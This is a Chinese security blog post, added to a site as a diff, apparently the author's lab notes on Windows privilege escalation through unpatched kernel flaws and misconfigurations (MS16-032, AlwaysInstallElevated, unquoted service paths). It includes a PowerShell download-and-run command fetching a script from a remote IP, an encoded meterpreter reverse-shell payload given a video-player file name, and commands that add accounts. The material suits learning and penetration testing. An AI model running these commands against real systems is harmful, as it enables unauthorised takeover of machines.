@@ -1,0 +1,664 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="在Windows中其实可以分为四种权限system还不是最高权限。分别是User、Administrator、System、TrustedInstaller。前面3种比较常见，trustedInstaller在常规操作中经常不会涉及（我还没用过这个权限）      User:普通用户权限，是系统中最安全的权限（因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。 Administra">
+<meta property="og:type" content="article">
+<meta property="og:title" content="权限提升之溢出和系统配置错误">
+<meta property="og:url" content="https://mayi077.github.io/2021/04/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8B%E6%BA%A2%E5%87%BA%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="在Windows中其实可以分为四种权限system还不是最高权限。分别是User、Administrator、System、TrustedInstaller。前面3种比较常见，trustedInstaller在常规操作中经常不会涉及（我还没用过这个权限）      User:普通用户权限，是系统中最安全的权限（因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。 Administra">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gp41awxptcj30nn0bkaa7.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/006Glg0Bgy1gp439a2g80j31030hf0w2.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/006Glg0Bgy1gp431rv6dfj315s0em41s.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/006Glg0Bgy1gp43nxe8gsj30o10jwjum.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bgy1gp4ca02u50j30mw0ez406.jpg">
+<meta property="article:published_time" content="2021-04-01T13:59:53.000Z">
+<meta property="article:modified_time" content="2021-04-01T14:02:17.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gp41awxptcj30nn0bkaa7.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2021/04/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8B%E6%BA%A2%E5%87%BA%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>权限提升之溢出和系统配置错误 | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2021/04/01/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E4%B9%8B%E6%BA%A2%E5%87%BA%E5%92%8C%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          权限提升之溢出和系统配置错误
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-01 21:59:53 / 修改时间：22:02:17" itemprop="dateCreated datePublished" datetime="2021-04-01T21:59:53+08:00">2021-04-01</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">内网学习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>20 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>在Windows中其实可以分为四种权限system还不是最高权限。分别是User、Administrator、System、TrustedInstaller。前面3种比较常见，trustedInstaller在常规操作中经常不会涉及（我还没用过这个权限）    </p>
+<ul>
+<li>User:普通用户权限，是系统中最安全的权限（因为分配给该组的默认权限不允许成员修改操作系统的设置或用户资料)。</li>
+<li>Administrator:管理员权限。可以利用Windows 的机制将自己提升为Svstem权限，以便操作SAM文件等。</li>
+<li>System:系统权限。可以对SAM等敏感文件进行读取，往往需要将Administrator权限提升到System权限才可以对散列值进行Dump操作。</li>
+<li>TrustedInstaller:Windows中的最高权限。对系统文件，即使拥有System权限也无法进行修改。只有拥有TrustedInstaller权限的用户才可以修改系统文件。<a id="more"></a>
+<h3 id="0x01-横向提权和纵向提权"><a href="#0x01-横向提权和纵向提权" class="headerlink" title="0x01 横向提权和纵向提权"></a>0x01 横向提权和纵向提权</h3>&emsp;常用的提权方法有系统内核溢出提权、数据库提权、错误的系统配置提权、Web中间件漏洞提权、DLL劫持提权、滥用高权限令牌提权、第三方软件/服务提权。</li>
+</ul>
+<ol>
+<li>横向提权: 就是获取一个同级别角色的权限。</li>
+<li>纵向提权：从低权限角色获取到高权限角色的权限。（常规说的提权）</li>
+</ol>
+<h3 id="0x02-利用系统内核溢出漏洞提权分析"><a href="#0x02-利用系统内核溢出漏洞提权分析" class="headerlink" title="0x02 利用系统内核溢出漏洞提权分析"></a>0x02 利用系统内核溢出漏洞提权分析</h3><p>&emsp;系统内核溢出漏洞是一种通用的提权方法，攻击者通常可以使用该方法绕过系统的所有安全限制。利用该漏洞的关键是目标系统没有及时安装补丁。  </p>
+<h4 id="1、通过手动执行命令发现缺失补丁"><a href="#1、通过手动执行命令发现缺失补丁" class="headerlink" title="1、通过手动执行命令发现缺失补丁"></a>1、通过手动执行命令发现缺失补丁</h4><p>基础命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br></pre></td></tr></table></figure>
+<p>根据上面命令我们可以获得补丁的安装情况。我们可以根据寻找提权的exp，将已安装的补丁编号和exp编号进行对比，最后使用没有编号的exp进行提权。<br>对系统补丁包进行特定的查找：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr &#x2F;C:&quot;KB3143141&quot; &#x2F;C:&quot;KB3143141&quot;</span><br></pre></td></tr></table></figure>
+<p>可以根据<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">【参考链接】</a>寻找漏洞编号适应系统以及对于补丁名,exp等。<br>&emsp;如果目标机器存在MS16-032（KB3139914)漏洞，可以通过metasploit或者powershell下的Invoke-MS16-032.ps1脚本进行提权，通过ps脚本可以执行任意程序，且可以带参数执行，无弹窗。</p>
+<h5 id="利用-powershell脚本"><a href="#利用-powershell脚本" class="headerlink" title="利用 powershell脚本"></a>利用 powershell脚本</h5><p><a href="https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1" target="_blank" rel="noopener">【脚本链接】</a> 也可以在前面给的<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">参考链接</a>中找到对应的powershell exp<br>我们可以先把脚本下载下来，或者复制保存下来，亦或者直接使用远程下载的方式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\win7&gt; powershell.exe -exec bypass -com &quot;&amp; &#123;import-module  C:\Users\win7\desktop\ms16-032.ps1;Invoko-ms16-032 -application cmd.exe -commandline&#39;&#x2F;c net user 1 1 &#x2F;add&#39;&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tvax4.sinaimg.cn/large/006Glg0Bgy1gp41awxptcj30nn0bkaa7.jpg" alt=""></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell  -exec bypass -c &quot;IEX (NEW-Object Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;1.1.1.6&#x2F;a.txt&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;&#x2F;c net user 2 test &#x2F;add&#39;&quot;    </span><br><span class="line">#远程下载，提权，添加用户</span><br></pre></td></tr></table></figure>
+
+
+<h4 id="2、通过metasploit发现缺失补丁"><a href="#2、通过metasploit发现缺失补丁" class="headerlink" title="2、通过metasploit发现缺失补丁"></a>2、通过metasploit发现缺失补丁</h4><ol>
+<li>首先使用如下命令进行木马生成<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.152.152 LPORT&#x3D;4444 -b &quot;\x00&quot; -e x86&#x2F;shikata_ga_nai -i 10 -f exe -o &#x2F;root&#x2F;桌面&#x2F;西瓜影音1.exe</span><br></pre></td></tr></table></figure></li>
+<li>kali监听创建一个session连接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 multi&#x2F;handler模块</span><br></pre></td></tr></table></figure></li>
+<li>使用 后渗透模块 <code>windows/gather/enum_patches</code> 进行配置然后run即可。</li>
+<li>另外<code>multi/recon/local_exploit_suggester</code>模块可以扫描可用的漏洞exp（需要设置一个session）<br><img data-src="//tvax1.sinaimg.cn/large/006Glg0Bgy1gp439a2g80j31030hf0w2.jpg" alt=""></li>
+</ol>
+<h4 id="3、Windows-exploit-suggester"><a href="#3、Windows-exploit-suggester" class="headerlink" title="3、Windows exploit suggester"></a>3、Windows exploit suggester</h4><p>suggester：提出建议的人<br>该工具可以将系统中已安装的补丁程序和微软的漏洞数据进行比较，并识别可以导致权限提升的漏洞，而它只需要知道目标系统的systeminfo信息即可。</p>
+<ol>
+<li>目标系统执行 <code>systeminfo</code> 并把文件内容复制下来放到kali里。</li>
+<li>kali上执行如下命令进行漏洞数据库更新<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;windows-exploit-suggester.py --update</span><br></pre></td></tr></table></figure></li>
+<li>接着我们需要安装打开excel文件的模块<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install xlrd&#x3D;&#x3D;1.2.0</span><br></pre></td></tr></table></figure></li>
+<li>最后使用如下命令进行扫描：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;windows-exploit-suggester.py  -d 2021-04-01-mssb.xls  -i systeminfo.txt</span><br></pre></td></tr></table></figure>
+<img data-src="//tva2.sinaimg.cn/large/006Glg0Bgy1gp431rv6dfj315s0em41s.jpg" alt=""><br>我们可以清晰的看到主机存在哪些漏洞。</li>
+</ol>
+<h4 id="4、利用powershell的sherlock脚本查找提权漏洞"><a href="#4、利用powershell的sherlock脚本查找提权漏洞" class="headerlink" title="4、利用powershell的sherlock脚本查找提权漏洞"></a>4、利用powershell的sherlock脚本查找提权漏洞</h4><p>可以利用<a href="https://github.com/rasta-mouse/Sherlock" target="_blank" rel="noopener">sherlock脚本</a>快速查找到可能用于本地权限提升的漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\win7&gt; powershell.exe   -exec bypass -c &quot;&amp; &#123; Import-Module  C:\Users\win7\Desktop\Sherlock.ps1;find-allvulns&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tvax2.sinaimg.cn/large/006Glg0Bgy1gp43nxe8gsj30o10jwjum.jpg" alt=""></p>
+<h3 id="0x03-Windows-系统配置错误利用"><a href="#0x03-Windows-系统配置错误利用" class="headerlink" title="0x03 Windows 系统配置错误利用"></a>0x03 Windows 系统配置错误利用</h3><p>&emsp;在windows中攻击者通常会尝试使用系统内核溢出漏洞来提权，但是如果碰到无法使用系统内核溢出漏洞提权的情况下，就会利用系统中的配置错误来提权。<br>&emsp;windows中的常见错误配置有，管理员凭据配置错误、服务配置错误、故意削弱的安全措施、用户权限过高。</p>
+<h4 id="1、系统服务权限配置错误"><a href="#1、系统服务权限配置错误" class="headerlink" title="1、系统服务权限配置错误"></a>1、系统服务权限配置错误</h4><p>windows 系统服务文件在操作系统启动时会被加载和执行，并在后台调用可执行文件。如果我们有一个低权限用户对对此类系统服务调用的可执行文件有写权限，就可以将该文件替换为任意文件并随着系统服务的启动获得系统权限。windows服务是system权限运行的，正是我们想要获得的权限。<br>系统服务权限配置错误（可写目录漏洞）有以下两种情况：</p>
+<ol>
+<li>服务未运行，攻击者会使用任意服务替换原来的服务，然后重启服务。</li>
+<li>服务正在运行且无法被中止（绝大多数情况），我们可以利用dll劫持技术并尝试重启服务来提权。</li>
+</ol>
+<h5 id="1-PowerUp-下的实战利用"><a href="#1-PowerUp-下的实战利用" class="headerlink" title="(1) PowerUp 下的实战利用"></a>(1) PowerUp 下的实战利用</h5><p><a href="">【PowerUp】</a> 提供了一些本地提权方法，可以通过很多实用的脚本来寻找目标机器windows服务漏洞。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\win7&gt; powershell.exe -exec bypass -c &quot;&amp; &#123; Import-Module  C:\Users\win7\Desktop\powerUp.ps1;Invoke-allchecks&#125;&quot;</span><br></pre></td></tr></table></figure>
+<p><img data-src="//tvax3.sinaimg.cn/large/006Glg0Bgy1gp4ca02u50j30mw0ez406.jpg" alt=""><br>可以看出PowerUp 列出了可能存在问题的所有服务，并在 AbuseFunction 部分直接给出了利用方式。我们可以利用如下方式来利用提权：（未成功）</p>
+<h5 id="2-Metasploit-下的实战利用"><a href="#2-Metasploit-下的实战利用" class="headerlink" title="(2) Metasploit 下的实战利用"></a>(2) Metasploit 下的实战利用</h5><p>&emsp;在Metasploit中对应的利用模块是 <code>service_permissions</code>。选择<code>AGGRESSIVE</code>选项，可以利用目标机器上每一个有缺陷的服务。该选项被禁用时，该模块在第一次提权成功后就会停止工作。<br>&emsp;service_premissions 模块使用两种方法来获取system权限：如果meterpreter以管理员权限运行，该模块会尝试创建并运行一个新的服务。如果当前权限不允许创建服务，该模块会判断哪些服务的文件或者文件夹权限有问题，并允许其进行劫持。在创建服务或者劫持已经存在的服务时，该模块会创建一个可执行的程序，其文件名和路径都是随机的。</p>
+<p>（还是未成功，不知道是不是我的机器原因）<br><strong>好像是应为我的win7是家庭版的（难受了）</strong></p>
+<h4 id="2、注册表键-AlwaysInstallElevated"><a href="#2、注册表键-AlwaysInstallElevated" class="headerlink" title="2、注册表键 AlwaysInstallElevated"></a>2、注册表键 AlwaysInstallElevated</h4><p>&emsp;注册表键 AlwaysInstallElevated 是一个策略的设置项。Windows 允许低权限用户以System权限允许安装文件。如果启用此策略设置项，那么任何权限的用户都能以system权限来安装恶意MSI文件。<br><strong>PathsAlwaysInstallElevated漏洞产生的原因</strong><br>&emsp;该漏洞产生的原因是用户开启了Windows Installer特权安装功能<br>&emsp;在“允许”设置柜中输入<code>gpedit.msc</code>，打开组策略编辑器。</p>
+<ul>
+<li>组装略——计算机配置——管理模板——Windows组件——Windows Insaller——永远以高特权进行安装:选择启用。</li>
+<li>组策略——用户配置-——管理模板——Windows组件——Windows Intaller——永远以高特权进行安装:选择启用。</li>
+</ul>
+<p>设置完毕后会在注册表的以下两个位置自动创建键值‘1’   </p>
+<ul>
+<li>HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstall Elevated</li>
+<li>HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstall Elevated</li>
+</ul>
+<p><strong>Windows Installer的相关知识点</strong><br>&emsp; Installer是Windows 操作系统的组件之一， 专门用来管理和配置软件服务。Windows Installer 除了是一个安装程序，还用于管理软件的安装管理软件组件的添加和删除，监视文件的还原、通过回滚进行灾难恢复等。<br>&emsp;Windowrs Installer分为客户端安装服务(Msiexec.exe)和MSI文件两部分。Windows Installer通过Msiexec.exe安装MSI文件包含的程序。MSI文件是Windows Installer的数据包，它实际上是一个数据库，包含安装和卸载软件时需要的大量指令和数据。Msiexec.exe用于安装MSI文件，一般在运行Microsoft Update安装更新或者安装一些软件的时候使用，占用内存较多。简单来说，双击MSI文件就会运行Msiexec.exe。</p>
+<p><strong>PowerUp下的实战</strong><br>&emsp;使用PowerUp的Get-RsigtyswiylstnlElvatee模块来检查注册表键是否被设置。如果AlwaysInstallElevated注册表键已经被设置，就意味着MSI文件是以System 权限运行的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString(&#39;c:&#x2F;Users&#x2F;win7&#x2F;desktop&#x2F;PowerUp.ps1&#39;);Get-RegistryAlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+<p>但是我得到的值是false，奇怪的是win7家庭版还没有<code>gpedit.msc</code> 搜组策略也搜不到。xp有没有powershell，win10关了防病毒重启一直没开启来，那就想不试了。</p>
+<p><strong>利用</strong><br>&emsp;假设返回的是true吧</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Write-UserAddMSI   #管理员权限运行</span><br><span class="line">PS C:\&gt; msiexec &#x2F;q &#x2F;i UserAdd.msi    #普通用户权限运行</span><br><span class="line">&#x2F;quiet    在安装过程中禁止向用户发送消息</span><br><span class="line">&#x2F;qn    不使用GUI</span><br><span class="line">&#x2F;i    安装程序</span><br></pre></td></tr></table></figure>
+<p>也可以利用Msf的<code>use exploit/windows/local/always_install_elevated</code>完成上述操作</p>
+<p>只要禁用注册表键 <code>AlwaysInstallElevated</code>,就可以阻止攻击者通过MSI文件进行提取。</p>
+<h4 id="3、可信任服务路径漏洞"><a href="#3、可信任服务路径漏洞" class="headerlink" title="3、可信任服务路径漏洞"></a>3、可信任服务路径漏洞</h4><p>&emsp;可信任服务路径(包含空格且没有引号的路径)漏洞利用了Windows 文件路径解析的特性并涉及服务路径的文件/文件夹权限(存在缺陷的服务程序利用了属于可执行文件的文件/文件夹的权限)。<br>&emsp;如果一个服务 的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的。<br><strong>该漏洞存在如下两种可能：</strong></p>
+<ol>
+<li>如果路径与服务有关，就任意创建一个服务或者编译Sericce模板。</li>
+<li>如果路径与可执行文件有关，就任意创建个可执行文件。</li>
+</ol>
+<h5 id="1-漏洞产生的原因"><a href="#1-漏洞产生的原因" class="headerlink" title="(1) 漏洞产生的原因"></a>(1) 漏洞产生的原因</h5><p>&emsp;因为windows服务通常都是以System权限运行的，所以系统在解析服务所对应的文件路径中的空格时，也会以系统权限进行。<br>例如，有一个文件路径”C:\Program Files\ Some Folder\Service.exe”,对于该路径中的每一个空格，Windows 都会尝试寻找并执行与空格前面的名字相匹配的程序。操作系统会对路径中空格的所有可能情况进行尝试，直至找到一个能够匹配的程序。<br>在本例中，Windows 会依次尝试确</p>
+<ul>
+<li>C:\Program.exe</li>
+<li>C:\Program Files\ Some.exe</li>
+<li>C:\Program Files\ Some Folder\Service.exe</li>
+</ul>
+<p>&emsp;因此，如果一个被“适当”命名的可执行程序被上传到可受影响的目录中，服务一旦重启，该程序就会以Syten权限运行(在大多数情况下)</p>
+<h5 id="2-利用"><a href="#2-利用" class="headerlink" title="(2) 利用"></a>(2) 利用</h5><p>&emsp;首先检测目标主机是否存在该漏洞。使用wmic命令列出所有没被双引号引起来的服务的路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service get name,displayname,pathname,startmode |findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr &#x2F;i &#x2F;v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<p>接下来，检测是否有对目标文件夹的写文件权限。这里我们使用windows的内置工具 <code>icacls</code> ，检测对应的目录权限如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Program Files</span><br><span class="line">icacls C:\Program Files\ Some Folder</span><br></pre></td></tr></table></figure>
+<p>结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">C:\Users\win7&gt;icacls &quot;C:\Program Files&quot;</span><br><span class="line">C:\Program Files NT SERVICE\TrustedInstaller:(F)</span><br><span class="line">                 NT SERVICE\TrustedInstaller:(CI)(IO)(F)</span><br><span class="line">                 NT AUTHORITY\SYSTEM:(M)</span><br><span class="line">                 NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)</span><br><span class="line">                 BUILTIN\Administrators:(M)</span><br><span class="line">                 BUILTIN\Administrators:(OI)(CI)(IO)(F)</span><br><span class="line">                 BUILTIN\Users:(RX)</span><br><span class="line">                 BUILTIN\Users:(OI)(CI)(IO)(GR,GE)</span><br><span class="line">                 CREATOR OWNER:(OI)(CI)(IO)(F)</span><br><span class="line"></span><br><span class="line">已成功处理 1 个文件; 处理 0 个文件时失败</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(M):修改。</span><br><span class="line">(F): 完全控制。</span><br><span class="line">(CI): 从属容器将继承访问控制项。</span><br><span class="line">(OI): 从属文件将继承访问控制项。</span><br></pre></td></tr></table></figure>
+
+<p>我们可以使用如下命令来重启服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc stop service_name</span><br><span class="line">sc start service_name</span><br></pre></td></tr></table></figure>
+
+<p>也可以使用msf中的<code>exploit/windows/local/trusted_service_path</code>模块进行渗透测试。该模块会将可执行程序放到受影响的文件夹中，然后将受影响的服务重启<br> <strong>命令执行后，反弹一个新的meterpreter，但是反弹的会很快终端，需迁移进程</strong><br>在渗透测试中，需要在终止载荷进程之前将它迁移到其他进程中，可以使用“set AutoRunScript migrate -f”命令自动迁移进程</p>
+<h4 id="4、自动安装配置文件"><a href="#4、自动安装配置文件" class="headerlink" title="4、自动安装配置文件"></a>4、自动安装配置文件</h4><p>网络管理员在内网中配置同一个环境时，通常会采用脚本化批量部署。在这个过程中，会使用配置文件。这些文件可能包含本地管理员账户密码信息。这些文件列举如下：</p>
+<ul>
+<li>C:\sysprep.inf</li>
+<li>C:\sysprep\sysprep.xml</li>
+<li>等等看书【187】页</li>
+</ul>
+<p>也可以使用 </p>
